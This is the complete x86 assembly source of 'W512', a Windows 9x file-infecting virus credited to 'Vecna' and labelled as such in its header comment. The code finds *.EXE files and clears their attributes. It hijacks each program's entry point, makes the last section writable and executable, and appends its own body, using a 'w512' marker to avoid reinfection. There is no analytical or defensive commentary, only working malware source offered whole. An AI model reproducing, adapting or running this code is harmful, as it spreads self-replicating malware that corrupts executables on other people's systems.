   ;[W512] by Vecna
   ;
   ;A tiny w9x direct action ring3 virus!

   .386p
   .model flat
   locals
   .data
   dd ?

   .code

   ofs   equ offset
   by    equ byte ptr
   wo    equ word ptr
   dwo   equ dword ptr
   k32   equ 0bff70000h

   start:
          cmp by [esp+3], 0bfh
          push ofs stub
     old_eip equ dwo $-4
          je @@1
          ret
     @@1:
          call get_delta
          call vinit
          mov ah, 1ah
          lea edx, [ebp+ofs dta-ofs delta]
          call int21
          mov ah, 4eh
          call @@2
          db '*.EXE', 0
     @@2:
          pop edx
          mov ecx, 27
     @@3:
          call int21
          jc @@4
          lea edx, [ebp+ofs dta+1eh-ofs delta]
          call infect
          mov ah, 4fh
          jmp @@3
     @@4:
          ret

   get_delta:
          call delta
     delta:
          pop ebp
          ret

   int21:
          call get_delta
          push ecx
          push eax
          push 002a0010h
          call [ebp+ofs vxdcall-ofs delta]
          ret

   vinit:
          call @@set_seh
          mov esp, [esp+8]
          jmp @@fault
     @@set_seh:
          sub ecx, ecx
          push dwo fs:[ecx]
          mov fs:[ecx], esp
          cmp dwo ds:[k32+80h], 'EP'
          jnz @@fault
          mov esi, ds:[k32+80h+78h]
          add esi, k32+1ch
          mov eax, [esi]
          mov ebx, [eax+k32]
          add ebx, k32
          mov [ebp+ofs vxdcall-ofs delta], ebx
          clc
          db 0b0h
     @@fault:
          stc
          pop dwo fs:[0]
          pop ecx
          ret

   infect:
          call @@set_seh
          mov esp, [esp+8]
          jmp @@fault
     @@set_seh:
          sub ecx, ecx
          push dwo fs:[ecx]
          mov fs:[ecx], esp
          mov ax, 4300h
          call int21
          jc @@fault
          push edx
          push ecx
          mov ax, 4301h
          sub ecx, ecx
          call int21
          jc @@1
          mov ax, 3d02h
          call int21
          mov ebx, eax
          jc @@1
          mov ah, 3fh
          mov ecx, 1024
          lea edx, [ebp+header-ofs delta]
          mov esi, edx
          call int21
          jc @@2
          xor eax, ecx
          jnz @@2
          cmp wo [esi], 'ZM'
          jne @@2
          mov eax, dwo [esi+3ch]
          add esi, eax
          cmp eax, 900
          jnb @@2
          cmp dwo [esi], 'EP'
          jne @@2
          mov eax, '215w'
          cmp dwo [esi+88], eax
          mov dwo [esi+88], eax
          je @@2
          cmp wo [esi+4], 014ch
          jne @@2
          movzx eax, wo [esi+22]
          not al
          test eax, 2002h
          jnz @@2
          movzx eax, wo [esi+6]
          dec eax
          imul eax, eax, 40
          lea edi, [esi+0e0h+24]
          add edi, eax
          mov edx, [edi+16]
          push edx
          add edx, [edi+12]
          xchg edx, [esi+40]
          mov [ebp+ofs old_eip-ofs delta], edx
          pop edx
          add edx, [edi+20]
          mov dwo [edi+36], 0c0000040h
          add dwo [edi+8], ofs vvend-ofs start
          add dwo [edi+16], ofs vend-ofs start
          mov eax, [esi+52]
          add [ebp+ofs old_eip-ofs delta], eax
          mov ax, 4200h
          sub ecx, ecx
          call int21
          mov ah, 40h
          lea edx, [ebp+ofs start-ofs delta]
          mov ecx, ofs vend-ofs start
          call int21
          mov ax, 4200h
          sub ecx, ecx
          cdq
          call int21
          mov ah, 40h
          lea edx, [ebp+ofs header-ofs delta]
          mov ecx, 1024
          call int21
     @@2:
          mov ah, 3eh
          call int21
     @@1:
          pop ecx
          pop edx
          mov ax, 4301h
          call int21
     @@fault:
          pop dwo fs:[0]
          pop ecx
          ret

   vxdcall dd 0

   vend equ this byte

   header db 1024 dup (0)

   dta    db 44 dup (0)

   vvend equ this byte

   stub:
          push 0
          call @@1
          db '(c) vecna', 0
     @@1:
          call @@2
          db 'first generation', 0
     @@2:
          push 0
     extrn MessageBoxA:proc
          call MessageBoxA
          push 0
     extrn ExitProcess:proc
          call ExitProcess

   end    start
